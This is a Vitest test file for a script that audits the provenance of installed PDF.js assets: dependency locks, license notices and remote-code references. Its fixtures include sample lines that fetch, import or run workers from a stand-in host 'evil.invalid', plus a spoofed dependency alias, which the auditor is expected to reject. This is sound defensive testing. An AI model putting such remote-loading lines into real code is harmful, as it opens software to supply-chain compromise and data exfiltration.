import { copyFileSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { inspectPdfEngineProvenance369 } from "../scripts/audit-pdf-engine-provenance-369";

const repo = resolve(import.meta.dirname, "..");
const temp = mkdtempSync(join(tmpdir(), "pdf369-real-assets-"));
let next = 0;
const artifactPaths = [
  "build/pdf.mjs", "build/pdf.worker.mjs", "legacy/build/pdf.mjs", "package.json", "LICENSE",
  "wasm/jbig2.wasm", "wasm/openjpeg.wasm", "wasm/qcms_bg.wasm", "wasm/quickjs-eval.wasm",
  "wasm/LICENSE_JBIG2", "wasm/LICENSE_QCMS", "wasm/LICENSE_PDFJS_JBIG2",
  "wasm/LICENSE_OPENJPEG", "wasm/LICENSE_PDFJS_OPENJPEG", "wasm/LICENSE_PDFJS_QCMS",
  "standard_fonts/LICENSE_LIBERATION", "standard_fonts/LICENSE_FOXIT", "cmaps/LICENSE",
];

function isolate(code = 'export const pdf = import("pdfjs-dist");'): string {
  const root = join(temp, String(next++));
  for (const path of artifactPaths) {
    const output = join(root, "node_modules/pdfjs-dist", path);
    mkdirSync(dirname(output), { recursive: true });
    copyFileSync(join(repo, "node_modules/pdfjs-dist", path), output);
  }
  mkdirSync(join(root, "src/engines/pdf"), { recursive: true });
  writeFileSync(join(root, "src/engines/pdf/probe.ts"), code);
  const own = JSON.parse(readFileSync(join(repo, "package.json"), "utf8"));
  const lock = JSON.parse(readFileSync(join(repo, "package-lock.json"), "utf8"));
  writeFileSync(join(root, "package.json"), JSON.stringify({ dependencies: { "pdfjs-dist": own.dependencies["pdfjs-dist"] } }));
  writeFileSync(join(root, "package-lock.json"), JSON.stringify({
    lockfileVersion: 3,
    packages: { "": { dependencies: { "pdfjs-dist": lock.packages[""].dependencies["pdfjs-dist"] } },
      "node_modules/pdfjs-dist": lock.packages["node_modules/pdfjs-dist"] },
  }));
  return root;
}
afterAll(() => rmSync(temp, { force: true, recursive: true }));

describe("#369 installed PDF.js provenance and real AST bypass regressions", () => {
  it("accepts the actual local PDF.js assets and locked root dependency", () => {
    expect(inspectPdfEngineProvenance369(isolate()).imports.remoteCount).toBe(0);
  }, 20_000); // Real PDF.js copied-code AST audit exceeds Vitest's 5s default on shared Linux CI CPU.
  it("allows relative local worker and URL references and mutable URL reassignment", () => {
    const code = [
      'const local = new URL("./pdf.worker.mjs", import.meta.url);',
      'new Worker(local);',
      'fetch(new URL("./wasm/jbig2.wasm", import.meta.url));',
      'let replaceable = "https://evil.invalid/original.mjs";',
      'replaceable = "./pdf.worker.mjs";',
      'new Worker(replaceable);',
    ].join("\n");
    expect(inspectPdfEngineProvenance369(isolate(code)).imports.remoteCount).toBe(0);
  }, 20_000); // Timing budget changes only; AST security refusals/assertions are unchanged.

  const unsafeSource = [
    ["later importScripts argument", 'importScripts("/local.js", "https://evil.invalid/remote.js");'],
    ["member importScripts", 'self.importScripts("https://evil.invalid/remote.js");'],
    ["URL passed directly to fetch", 'fetch(new URL("https://evil.invalid/upload"));'],
    ["URL parser whitespace normalized before fetch", 'fetch("  https://evil.invalid/upload");'],
    ["executable blob remote Worker URL", 'new Worker("blob:https://evil.invalid/remote-worker-id");'],
    ["computed static dynamic import", 'import("https://evil.invalid/" + "pdf.mjs");'],
    ["MuPDF imported through constant concatenation", 'import("mu" + "pdf");'],
    ["explicit remote pdfjs-dist workerSrc", 'pdfjs.GlobalWorkerOptions.workerSrc = "https://evil.invalid/pdf.worker.mjs";'],
    ["local worker argument bound to remote URL", 'const externalWorker = new URL("https://evil.invalid/worker.mjs"); new Worker(externalWorker);'],
  ] as const;
  it.each(unsafeSource)("refuses %s", (_label, code) => {
    const root = isolate(code);
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*(?:remote|MuPDF)/iu);
  });

  it("refuses dependency and root lock ranges that contradict the inspected vendor version", () => {
    const root = isolate();
    const own = join(root, "package.json");
    const manifest = JSON.parse(readFileSync(own, "utf8"));
    manifest.dependencies["pdfjs-dist"] = "npm:mupdf@1.0.0";
    writeFileSync(own, JSON.stringify(manifest));
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*(?:dependency|version|lock|MuPDF)/iu);

    const root2 = isolate();
    const lockPath = join(root2, "package-lock.json");
    const lock = JSON.parse(readFileSync(lockPath, "utf8"));
    lock.packages[""].dependencies["pdfjs-dist"] = "npm:mupdf@1.0.0";
    writeFileSync(lockPath, JSON.stringify(lock));
    expect(() => inspectPdfEngineProvenance369(root2)).toThrow(/PDF369_NO_GO.*(?:dependency|version|lock|MuPDF)/iu);
  });

  it("refuses an explicit new proprietary commercial restriction appended to a valid installed notice", () => {
    const root = isolate();
    const license = join(root, "node_modules/pdfjs-dist/wasm/LICENSE_OPENJPEG");
    writeFileSync(license, readFileSync(license, "utf8") + "\nAdditional restriction: commercial use prohibited.\n");
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*(?:license|notice)/iu);
  });
  it("refuses an explicit new proprietary commercial restriction appended to the Apache root license", () => {
    const root = isolate();
    const license = join(root, "node_modules/pdfjs-dist/LICENSE");
    writeFileSync(license, readFileSync(license, "utf8") + "\nAdditional restriction: commercial use forbidden.\n");
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*license/iu);
  });
});
